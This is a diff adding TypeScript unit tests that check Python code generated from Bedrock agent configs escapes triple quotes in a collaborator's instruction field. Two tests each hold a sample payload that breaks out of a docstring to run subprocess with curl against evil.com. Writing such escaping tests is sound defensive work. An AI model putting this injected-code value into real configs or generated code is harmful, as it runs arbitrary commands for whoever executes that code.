@@ -172,6 +172,61 @@ describe('StrandsTranslator', () => {
   });
 });
 
+function makeCollaboratorConfig(collaborationInstruction: string): BedrockAgentConfig {
+  const collaboratorAgentConfig = makeSimpleAgentConfig();
+  return makeSimpleAgentConfig({
+    agent: {
+      ...makeSimpleAgentConfig().agent,
+      agentCollaboration: 'SUPERVISOR_ROUTER',
+    },
+    collaborators: [
+      {
+        agent: { ...collaboratorAgentConfig.agent, agentName: 'collab-agent' },
+        action_groups: [],
+        knowledge_bases: [],
+        collaborators: [],
+        collaboratorName: 'collab',
+        collaborationInstruction,
+      },
+    ],
+  });
+}
+
+describe('StrandsTranslator - collaborationInstruction injection safety', () => {
+  it('neutralizes triple-quote injection in collaborationInstruction', () => {
+    // Payload attempts to break out of the """...""" docstring to inject executable code
+    const payload = '"""\nimport subprocess; subprocess.run(["curl","evil.com"])\n"""';
+    const config = makeCollaboratorConfig(payload);
+    const translator = new StrandsTranslator(config, {
+      agentConfig: config,
+      enableMemory: false,
+      memoryOption: 'none',
+      enableObservability: false,
+    });
+    const { mainPyContent } = translator.translate();
+    // The """ must be escaped to \"\"\" — confirming the docstring is not broken out of
+    expect(mainPyContent).toContain('\\"\\"\\"');
+    // No bare """ should appear inside the tool docstring
+    expect(mainPyContent).not.toMatch(/""".*"""\s*"""/s);
+  });
+});
+
+describe('LangGraphTranslator - collaborationInstruction injection safety', () => {
+  it('neutralizes triple-quote injection in collaborationInstruction', () => {
+    const payload = '"""\nimport subprocess; subprocess.run(["curl","evil.com"])\n"""';
+    const config = makeCollaboratorConfig(payload);
+    const translator = new LangGraphTranslator(config, {
+      agentConfig: config,
+      enableMemory: false,
+      memoryOption: 'none',
+      enableObservability: false,
+    });
+    const { mainPyContent } = translator.translate();
+    expect(mainPyContent).toContain('\\"\\"\\"');
+    expect(mainPyContent).not.toMatch(/""".*"""\s*"""/s);
+  });
+});
+
 describe('LangGraphTranslator', () => {
   it('generates valid LangChain/LangGraph Python code for a simple agent', () => {
     const config = makeSimpleAgentConfig();
